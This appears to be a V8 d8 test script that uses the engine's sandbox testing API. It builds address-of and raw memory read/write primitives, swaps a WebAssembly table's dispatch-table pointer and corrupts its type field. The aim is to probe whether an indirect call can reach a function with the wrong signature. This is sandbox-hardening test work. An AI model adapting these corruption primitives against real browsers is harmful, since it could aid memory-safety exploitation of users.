// C21 H26: hidden dispatch injection with incompatible donor entry under
// generic funcref import.
//
// H25 blocks generic dispatch table imported as typed table. This variant keeps
// everything generic, but donor index 1 has an incompatible signature. If H23
// injection bypassed sig checks, this would call bad. Safe result is
// RuntimeError:function signature mismatch.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kWeakHeapObjectTag = 3;
const kHeapObjectTag = 1;
const kTrustedDispatchTableOffset = 0x1c;
const kWasmTableObjectType =
    Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
const kRawTypeOffset = Sandbox.getFieldOffset(kWasmTableObjectType, 'raw_type');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrof(obj) {
  return Sandbox.getAddressOf(obj) & ~kWeakHeapObjectTag;
}

function tagged(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function read32(addr) {
  return memory.getUint32(addr, true);
}

function write32(addr, val) {
  memory.setUint32(addr, val, true);
}

function rawTypeField(table) {
  return memory.getUint32(tagged(table) + kRawTypeOffset - kHeapObjectTag, true);
}

function corruptRawType(table, rawTypeSmi) {
  Sandbox.corruptObjectField(table, 'raw_type', rawTypeSmi);
}

function makeTargets() {
  let b = new WasmModuleBuilder();
  let good = b.addType(kSig_i_i);
  let bad = b.addType(kSig_i_ii);
  b.addFunction('f0', good)
      .addBody([kExprLocalGet, 0, kExprI32Const, 0x10, kExprI32Add])
      .exportFunc();
  b.addFunction('bad', bad)
      .addBody([kExprLocalGet, 0, kExprLocalGet, 1, kExprI32Add])
      .exportFunc();
  return b.instantiate().exports;
}

function makeCaller(table) {
  let b = new WasmModuleBuilder();
  let good = b.addType(kSig_i_i);
  let t = b.addImportedTable('imp', 'table', 1, 3, kWasmFuncRef);
  b.addFunction('call', kSig_i_ii)
      .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprCallIndirect, good, t,
      ])
      .exportFunc();
  return b.instantiate({imp: {table}}).exports.call;
}

let externTable = new WebAssembly.Table({element: 'externref', initial: 1});
let externRefRawTypeSmi = rawTypeField(externTable);
let {f0, bad} = makeTargets();

let donor = new WebAssembly.Table({element: 'anyfunc', initial: 2, maximum: 2});
donor.set(0, f0);
donor.set(1, bad);

let victim = new WebAssembly.Table({element: 'anyfunc', initial: 1, maximum: 3});
victim.set(0, f0);
let funcrefRawTypeSmi = rawTypeField(victim);

write32(addrof(victim) + kTrustedDispatchTableOffset,
        read32(addrof(donor) + kTrustedDispatchTableOffset));
corruptRawType(victim, externRefRawTypeSmi);
let marker = {kind: 'bad-sig-marker'};
victim.grow(2, marker);
print(`entry1_is_marker=${victim.get(1) === marker}`);
corruptRawType(victim, funcrefRawTypeSmi);

let call = makeCaller(victim);
print(`after0=${call(0, 7)}`);
try {
  print(`after1=${call(1, 7)}`);
} catch (e) {
  print(`after1_throw=${e.name}:${e.message}`);
}
